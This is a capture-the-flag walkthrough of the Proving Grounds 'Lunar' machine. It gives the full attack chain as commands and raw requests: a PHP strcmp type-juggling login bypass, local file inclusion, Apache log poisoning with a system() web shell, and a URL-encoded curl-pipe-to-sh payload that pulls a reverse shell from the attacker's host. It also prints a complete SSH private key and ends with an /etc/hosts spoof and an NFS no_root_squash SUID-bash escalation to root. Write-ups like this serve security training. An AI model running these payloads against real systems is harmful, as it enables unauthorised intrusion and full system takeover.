### Lunar Proving Grounds Practice

### Difficult = Intermediate

### IP Address = 192.168.66.216

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ cat nmapscan 
# Nmap 7.92 scan initiated Mon Jan 16 05:54:41 2023 as: nmap -sCV -A -p22,111,80,2049 -oN nmapscan 192.168.144.216
Nmap scan report for 192.168.144.216
Host is up (0.56s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Lunar Studio
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      40657/udp   mountd
|   100005  1,2,3      43335/tcp   mountd
|   100021  1,3,4      38119/tcp   nlockmgr
|   100021  1,3,4      60511/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 16 05:55:37 2023 -- 1 IP address (1 host up) scanned in 56.52 seconds
```

We have ssh,http,nfs

Lets enumerate the nfs 

First i'll see what share is available and if it can be mounted

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ showmount -e 192.168.66.216                             
Export list for 192.168.66.216:
/srv/share localhost
```

But only localhost can mount the share too bad for us :(

Anyways lets move on to the web server

On heading there see a page which provides design for people
![image](https://user-images.githubusercontent.com/113513376/214081239-029ececd-a2b7-44c5-bbf6-d2b1a76bacb2.png)

Also there's a login page
![image](https://user-images.githubusercontent.com/113513376/214081505-eebc4116-5ace-4212-a9d1-45d74b1ebb42.png)

Trying sqli doesn't work so lets hit on gobuster

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ gobuster dir -u http://192.168.66.216 -w wordlist -x php,txt,zip         
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.66.216
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
2023/01/23 16:39:59 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 2512]
/backup.zip           (Status: 200) [Size: 1265712]
===============================================================
2023/01/23 16:40:05 Finished
===============================================================

```

Lets download the backup file
![image](https://user-images.githubusercontent.com/113513376/214082376-c597690a-8f24-495d-b23b-4273b63983f2.png)

Now unzipping it and viewing the files in it

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ mv ~/Downloads/backup.zip .
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ mkdir backup               
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ mv backup.zip backup
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ cd backup                       
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ unzip backup.zip   
Archive:  backup.zip
  inflating: completed.php           
  inflating: css/bootstrap.css       
  inflating: css/font-awesome.min.css  
  inflating: css/responsive.css      
  inflating: css/style.css           
  inflating: css/style.css.map       
  inflating: css/style.scss          
  inflating: dashboard.css           
  inflating: dashboard.php           
 extracting: favicon.ico             
  inflating: fonts/fontawesome-webfont.ttf  
  inflating: fonts/fontawesome-webfont.woff  
  inflating: fonts/fontawesome-webfont.woff2  
  inflating: images/about-img.jpg    
  inflating: images/client-1.jpg     
  inflating: images/client-2.jpg     
  inflating: images/client-3.jpg     
  inflating: images/logo.png         
  inflating: images/p1.jpg           
  inflating: images/p2.jpg           
  inflating: images/p3.jpg           
  inflating: images/p4.jpg           
  inflating: images/p5.jpg           
  inflating: images/s1.png           
  inflating: images/s2.png           
  inflating: images/s3.png           
  inflating: images/s4.png           
  inflating: images/s5.png           
  inflating: images/s6.png           
  inflating: images/slider-img.jpg   
  inflating: index.html              
  inflating: js/bootstrap.js         
  inflating: js/custom.js            
  inflating: js/jquery-3.4.1.min.js  
  inflating: login.php               
  inflating: pending.php  
  ```
  
  Nice we see the its the web server files
  
  Lets check out login.php 
  ![image](https://user-images.githubusercontent.com/113513376/214082876-cbf57de0-3396-4e2d-be38-cee31592b217.png)
  
  Whats of interest to us is the php code
  
  ```
  <?php
session_start();
include 'creds.php';
$error = null;
if ($_POST) {

  if ($_POST['email'] && !empty($_POST['email']) && $_POST['email'] === 'liam@lunar.local' && strcmp($_POST['password'], $pwd) == 0) {
    
      $_SESSION['email'] = $_POST['email'];
      
      header('Location: dashboard.php');
      
      die();
  } 
  else {    
      $error = "Email or password is incorrect.";
  }    
    }
?>
```

We see it does a check that if the email sent to the server is `liam@lunar.local` and also it does string compare to the password being sent to the server with the password in the file creds.php

From here we know that the password variable is vulnerable to php type juggling

Reason why is because it comparision operator is weak and not approriate 

So lets just exploit this bug

I'll head back to the web login page and capture the request in burp suite

Then when i try loggin in now with a valid email
![image](https://user-images.githubusercontent.com/113513376/214084561-661866e8-4618-479a-96a8-af598de3a282.png)

Here's the request below

```
POST /login.php HTTP/1.1
Host: 192.168.66.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://192.168.66.216
Connection: close
Referer: http://192.168.66.216/login.php
Cookie: PHPSESSID=35cr6r4vvs6u6uu7hmrfsjlqng
Upgrade-Insecure-Requests: 1

email=liam%40lunar.local&password=
```

I'll edit the request to this

```
POST /login.php HTTP/1.1
Host: 192.168.66.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://192.168.66.216
Connection: close
Referer: http://192.168.66.216/login.php
Cookie: PHPSESSID=35cr6r4vvs6u6uu7hmrfsjlqng
Upgrade-Insecure-Requests: 1

email=liam%40lunar.local&password[]=""
```

After forwarding it we get redirected to dashboard.php cool
![image](https://user-images.githubusercontent.com/113513376/214084981-5a8b793f-8014-4289-965a-67b0240fbe50.png)

Since we have access to the dashboard.php file lets do source code review

```
<?php
session_start();

if (!isset($_SESSION['email'])) {
	header('Location: login.php');
    die();
}

$error = null;
?>
```

Thats the first portion that deals with giving access to the dashboard

The second portion contains juicy info

```
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['show'])) {
                if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
                    error_reporting(E_ALL ^ E_WARNING); 
                    include $_GET['show'] . $ext;
                } else {
                    echo 'You can select either one of these only';
                }
            }
        ?>
 ```
 
 Looking at the source code we can conclude that 
 
 ```
 1. This is a PHP script that checks if the GET parameter "show" is set
 2. If it is, it checks if the value of "show" contains the strings "pending" or "completed" using the function "containsStr"
 3. If the value of "show" contains either of those strings, it will include a file with the name of the value of "show" and an extension that is either defined in the GET parameter "ext" or defaults to '.php'
 4. If the value of "show" does not contain "pending" or "completed", the script will output an error message.
 5. The error reporting is set to ignore warnings
 ```
 
 Thanks ChatGPT xD
 
 From this we can conclude that this code is vulnerable to Local File Inclusion (LFI)
 
 But we need to append the payload to the string `pending/completed` 
 
 Given we provide an ext parameter, we can override the default php extension
 
 Lets now check it out on the web server 
![image](https://user-images.githubusercontent.com/113513376/214087315-a08599ea-82d1-466a-af13-54503ff748b6.png)

Here's how the payload should look like

```
http://192.168.66.216/dashboard.php?show=pending/../../../../../etc/passwd&ext=
```

We've now confirmed the lfi vulnerablity
![image](https://user-images.githubusercontent.com/113513376/214090345-1b1b6999-d038-4548-89bd-aba6ae54dbb2.png)

So lets get rce via this

One way of doing this is by performing Log Poisoning

But first we need to know the path where access/error logs are stored

By default apache2 logs are stored in `/var/log/apache2/access.log`

Now i'll try to read the file 
![image](https://user-images.githubusercontent.com/113513376/214092083-71549ba4-eb75-49d9-90b1-17e2ff293a6a.png)

Boom!!! So lets perform log poisoining 

```
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ telnet 192.168.66.216 80
Trying 192.168.66.216...
Connected to 192.168.66.216.
Escape character is '^]'.
<?php system($_REQUEST['cmd']); ?>

HTTP/1.1 400 Bad Request
Date: Mon, 23 Jan 2023 16:21:18 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
Connection closed by foreign host.
 ```
  
  Now that we have poisoined the log lets check if it really worked
  
  I'll ping my device to confirm if it works
  
  ```
  ──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Now the payload should be like this `http://192.168.66.216/dashboard.php?show=pending/../../../../../var/log/apache2/access.log&cmd=ping%20-c%202%20192.168.49.66&ext=`

Navigating to that it loads and on checking tcpdump we get a ping request 

```
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:23:12.621124 IP 192.168.66.216 > haxor: ICMP echo request, id 1, seq 1, length 64
17:23:12.621195 IP haxor > 192.168.66.216: ICMP echo reply, id 1, seq 1, length 64
17:23:13.642481 IP 192.168.66.216 > haxor: ICMP echo request, id 1, seq 2, length 64
17:23:13.642504 IP haxor > 192.168.66.216: ICMP echo reply, id 1, seq 2, length 64
17:23:13.949584 IP 192.168.66.216 > haxor: ICMP echo request, id 2, seq 1, length 64
17:23:13.949613 IP haxor > 192.168.66.216: ICMP echo reply, id 2, seq 1, length 64
17:23:15.076747 IP 192.168.66.216 > haxor: ICMP echo request, id 2, seq 2, length 64
17:23:15.076764 IP haxor > 192.168.66.216: ICMP echo reply, id 2, seq 2, length 64
```

Now lets get a reverse shell 

Here's the reverse shell payload used and its basically `curl 192.168.49.66:1337/shell.sh|sh` but url encoded

```
%63%75%72%6c%20%31%39%32%2e%31%36%38%2e%34%39%2e%36%36%3a%31%33%33%37%2f%73%68%65%6c%6c%2e%73%68%7c%73%68 
```

And i created a file called shell.sh which has a python reverse shell payload which i then hosted a python web server on port 1337

Also i'll set a netcat listener on port 80

Here's how the final payload should be

```
http://192.168.66.216/dashboard.php?show=pending/../../../../../var/log/apache2/access.log&cmd=%63%75%72%6c%20%31%39%32%2e%31%36%38%2e%34%39%2e%36%36%3a%31%33%33%37%2f%73%68%65%6c%6c%2e%73%68%7c%73%68&ext=
```

Back on the netcat listener we get a reverse shell

```
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.66] from (UNKNOWN) [192.168.66.216] 40454
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Now stabilizing the reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
```

After looting around i found the ssh-keys for the user liam in `/opt/liam/ssh-keys`

Here's the id_rsa file

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
XMUbx9M/i2At8AAAAKbGlhbUBsdW5hcgE=
-----END OPENSSH PRIVATE KEY-----
```

Now we can login to ssh using that ssh key as the user

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ ssh -i idrsa liam@192.168.66.216
The authenticity of host '192.168.66.216 (192.168.66.216)' can't be established.
ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.66.216' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 23 Jan 2023 06:18:47 PM UTC

  System load:  0.06              Processes:               247
  Usage of /:   53.1% of 9.78GB   Users logged in:         0
  Memory usage: 30%               IPv4 address for ens160: 192.168.66.216
  Swap usage:   0%


5 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ bash
liam@lunar:~$ 
```

Lets escalate our privilege to root

On checking the user's group we see he's among the `network` group

```
liam@lunar:~$ id
uid=1000(liam) gid=1000(liam) groups=1000(liam),1001(network)
liam@lunar:~$ 

```

Now lets check what files the network group has access to 

```
liam@lunar:~$ find / -group network 2>/dev/null
/etc/hosts
liam@lunar:~$ 
```

Cool we have access to edit the /etc/hosts file

Now if we remember we had nfs running but only localhost can mount the share

And a devices gets its localhost ip address from the /etc/hosts file 

Since we have full access to the /etc/hosts file we can therefore change the ip of the localhost to ours

```
127.0.0.1 localhost
```

Will be then replaced with

```
192.168.49.66 localhost
```

So lets do that 

Initial /etc/hosts file:

```
liam@lunar:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.0.1 lunar
liam@lunar:~$
```

Edited /etc/hosts file

```
liam@lunar:~$ cat /etc/hosts
192.168.49.66 localhost
127.0.0.1 lunar
liam@lunar:~$ 
```

Now to confirm if we can mount share now lets try it out 

First i'll create a directory for me to mount the nfs share 

```
┌──(mark__haxor)-[/mnt]
└─$ sudo mkdir mount 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[/mnt]
└─$ ls     
mount
                                                                                                                                                                                                                   
┌──(mark__haxor)-[/mnt]
└─$ 
```

Now i'll mount the share

```
┌──(mark__haxor)-[/mnt]
└─$ showmount -e 192.168.66.216
Export list for 192.168.66.216:
/srv/share localhost                                                                                                                                                                                                             
┌──(mark__haxor)-[/mnt]
└─$ sudo mount -t nfs 192.168.66.216:/srv/share mount -o nolock                                                                                                                                                                                                                 
┌──(mark__haxor)-[/mnt]
└─$ ls mount -la
total 8
drwxrwxrwx 2 root root 4096 May 18  2022 .
drwxr-xr-x 3 root root 4096 Jan 23 19:31 ..
                                                                                                                                                        
```

Now we have access to the share 

So lets check the target maybe there's nfs misconfiguration 

```
liam@lunar:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/share localhost(rw,sync,no_root_squash)
```

From the result we see `no_root_squash` is enabled also `read&write` access is enabled

With `no_root_squash` enabled we can exploit this box by uploading a binary which has `suid` perm set on it then run it on the target

So lets get this done xD

On the target we do:

```
liam@lunar:~$ cd /srv/share
liam@lunar:/srv/share$ ls
liam@lunar:/srv/share$ cp /usr/bin/bash .
liam@lunar:/srv/share$ ls -al
total 1164
drwxrwxrwx 2 root root    4096 Jan 23 18:40 .
drwxr-xr-x 3 root root    4096 May 18  2022 ..
-rwxr-xr-x 1 liam liam 1183448 Jan 23 18:40 bash
liam@lunar:/srv/share$ 
```

Then on our attacking machine we do:

```
┌──(mark__haxor)-[/mnt]
└─$ cd mount 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[/mnt/mount]
└─$ ls          
bash
                                                                                                                                                                                                                   
┌──(mark__haxor)-[/mnt/mount]
└─$ sudo chown root:root bash                                   
                                                                                                                                                                                                                   
┌──(mark__haxor)-[/mnt/mount]
└─$ sudo chmod +s bash           
                                                                                                                                                                                                                   
┌──(mark__haxor)-[/mnt/mount]
└─$ ls -la      
total 1164
drwxrwxrwx 2 root root    4096 Jan 23 19:40 .
drwxr-xr-x 3 root root    4096 Jan 23 19:31 ..
-rwsr-sr-x 1 root root 1183448 Jan 23 19:40 bash
```
Now that we've set the bash file to a suid binary lets run it on the target

```
liam@lunar:/srv/share$ ls -al
total 1164
drwxrwxrwx 2 root root    4096 Jan 23 18:40 .
drwxr-xr-x 3 root root    4096 May 18  2022 ..
-rwsr-sr-x 1 root root 1183448 Jan 23 18:40 bash
liam@lunar:/srv/share$ ./bash -p
bash-5.0# cd /root
bash-5.0# id
uid=1000(liam) gid=1000(liam) euid=0(root) egid=0(root) groups=0(root),1000(liam),1001(network)
bash-5.0# ls -al
total 44
drwx------  6 root root 4096 Jan 23 18:18 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root    9 May 18  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jul 13  2022 .cache
drwxr-xr-x  3 root root 4096 Jan  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   33 Jan 23 18:18 proof.txt
-rw-r--r--  1 root root   75 Jul 13  2022 .selected_editor
drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
drwx------  2 root root 4096 Jan  7  2021 .ssh
-rw-------  1 root root  819 Jul 13  2022 .viminfo
bash-5.0# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>



 
 



